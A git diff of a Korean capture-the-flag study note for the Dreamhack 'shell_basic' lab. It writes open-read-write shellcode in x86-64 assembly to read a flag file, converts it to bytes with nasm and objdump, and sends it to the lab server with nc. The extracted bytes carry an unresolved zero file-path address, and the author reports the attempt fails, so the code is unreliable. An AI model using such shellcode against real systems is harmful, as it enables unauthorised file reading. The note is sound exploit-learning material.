@@ -56,27 +56,83 @@ sc();
   > 어떻게 알 수 있는가?) read() 시스템 콜의 첫 번쨰 인자로 들어간 0이 표준 입력을 나타낸다.
 
 
-
-# 이제 orw쉘코드를 작성하자.
+# 어셈블리어로 /home/shell_basic/flag_name_is_loooooong 파일을 여는 orw셸코드를 어셈블리로 작성
 ```
-#include <stdio.h>
-#include <string.h>
+section .data
+    filepath db "/home/shell_basic/flag_name_is_loooooong", 0
 
-unsigned char shellcode[] = 
-"\x48\x31\xc0\x48\xbf\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x65\x6c\x6c\x5f"
-"\x62\x61\x73\x69\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x61\x6d\x65\x5f\x69"
-"\x73\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6e\x67\x00\x48\x89\xe7\x48\x31\xf6"
-"\x48\x31\xd2\xb0\x02\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x89\xe6\xb2"
-"\x80\x0f\x05\x48\x31\xff\x48\x89\xc6\xb0\x01\x0f\x05";
+section .text
+global _start
 
-int main() {
-    printf("Running shellcode...\n");
-    void (*sc)() = (void (*)())shellcode;
-    sc();
-    return 0;
-}
+_start:
+    ; open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY)
+    xor rax, rax                  ; rax = 0
+    mov rdi, filepath             ; rdi = 주소 (파일 경로)
+    xor rsi, rsi                  ; rsi = 0 (O_RDONLY)
+    mov rax, 2                    ; rax = 시스템 콜 번호 2 (open)
+    syscall
+
+    ; read(fd, buffer, 0x40)
+    mov rdi, rax                  ; rdi = fd (파일 디스크립터)
+    mov rsi, rsp                  ; rsi = 스택 (버퍼)
+    mov rdx, 0x40                 ; rdx = 64바이트 읽기
+    xor rax, rax                  ; rax = 시스템 콜 번호 0 (read)
+    syscall
+
+    ; write(1, buffer, 0x40)
+    mov rdi, 1                    ; rdi = 1 (stdout)
+    mov rax, 1                    ; rax = 시스템 콜 번호 1 (write)
+    syscall
+
+    ; exit(0)
+    xor rdi, rdi                  ; rdi = 0 (exit 코드)
+    mov rax, 60                   ; rax = 시스템 콜 번호 60 (exit)
+    syscall
 ```
-1) 이 코드는 /home/shell_basic/flag_name_is_loooooong 파일을 열 수 있도록 어셈블리어로 작성된 ORW shellcode를 C 언어 스켈레톤 코드에 이식한 후, 바이트 코드로 변환한 결과물이다.
+
+# 이 코드를 VS code로 sol.s 파일로 만든다.
+
+# 우분투를 실행하여 nasm 설치 후, 다음과 같은 명령어로 오브젝트 파일을 만든다.
+```
+nasm -f elf64 -o sol.o sol.s 
+```
+
+# objdump -d sol.o 명령어를 입력하면 다음과 같이 나옴
+```
+sol.o:     file format elf64-x86-64
 
 
-     
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   48 31 c0                xor    %rax,%rax
+   3:   48 bf 00 00 00 00 00    movabs $0x0,%rdi
+   a:   00 00 00
+   d:   48 31 f6                xor    %rsi,%rsi
+  10:   b8 02 00 00 00          mov    $0x2,%eax
+  15:   0f 05                   syscall
+  17:   48 89 c7                mov    %rax,%rdi
+  1a:   48 89 e6                mov    %rsp,%rsi
+  1d:   ba 40 00 00 00          mov    $0x40,%edx
+  22:   48 31 c0                xor    %rax,%rax
+  25:   0f 05                   syscall
+  27:   bf 01 00 00 00          mov    $0x1,%edi
+  2c:   b8 01 00 00 00          mov    $0x1,%eax
+  31:   0f 05                   syscall
+  33:   48 31 ff                xor    %rdi,%rdi
+  36:   b8 3c 00 00 00          mov    $0x3c,%eax
+  3b:   0f 05                   syscall
+```
+
+# 여기서 바이트 코드로 변환하면 다음과 같다.
+```
+\x48\x31\xc0\x48\xbf\x00\x00\x00\x00\x00\x00\x00\x00\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x40\x00\x00\x00\x48\x31\xc0\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05
+```
+
+# 이제 드림핵 주소를 연다.
+```
+nc host3.dreamhack.games 10396
+```
+
+# 만든 바이트 코드를 입력한다.
+  - 이러면 플래그가 나와야 하는데 아무 변화도 없다...
